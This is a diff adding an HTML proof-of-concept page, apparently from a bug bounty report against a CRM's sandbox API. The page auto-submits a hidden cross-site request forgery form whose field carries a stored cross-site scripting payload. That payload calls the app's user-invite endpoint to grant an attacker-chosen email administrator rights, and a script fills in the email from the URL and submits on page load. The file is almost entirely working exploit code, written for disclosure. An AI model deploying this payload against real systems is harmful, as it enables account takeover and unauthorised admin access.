@@ -1,0 +1,22 @@
+<html>
+  <body>
+	<form action="https://sandbox-se.upsales.com/api/v2/forms" method="POST">
+      <input type="hidden" name="name" value="XSS&#32;FORM" />
+      <input type="hidden" name="fields[0][name]" value="1" />
+      <input type="hidden" name="fields[0][title]" value="1" />
+      <input type="hidden" name="fields[0][datatype]" value="info" />
+      <input type="hidden" name="fields[0][info]" value="<img src onerror='$.ajax({url:`/api/v2/userInvites`,method:`POST`,contentType:`application/json`,data:JSON.stringify([{email:`kgadyrka+attacker@wearehackerone.com`,roleId:null,administrator:1,billingAdmin:0,teamLeader:0,export:0,language:`en-GB`,userParams:[{param_id:57,value:`SE`},{param_id:56,value:0},{param_id:55,value:0},{param_id:71,value:0},{param_id:231,value:`all`},{param_id:232,value:0},{param_id:235,value:false}],custom:[],active:1,ghost:0,crm:1,support:0,service:0,name:`Attacker`,userTitle:``,userCellPhone:``}])})' />" />
+      <input type="submit" value="Submit request" />
+    </form>
+	<script>
+	  const params = new URLSearchParams(window.location.search);
+      let email = params.get('email');
+      if (email) {
+        email = email.replace(/ /g, '+').trim();
+		    const infoInput = document.querySelector('input[name="fields[0][info]"]');
+        infoInput.value = infoInput.value.replace('kgadyrka+attacker@wearehackerone.com', email);
+      }
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
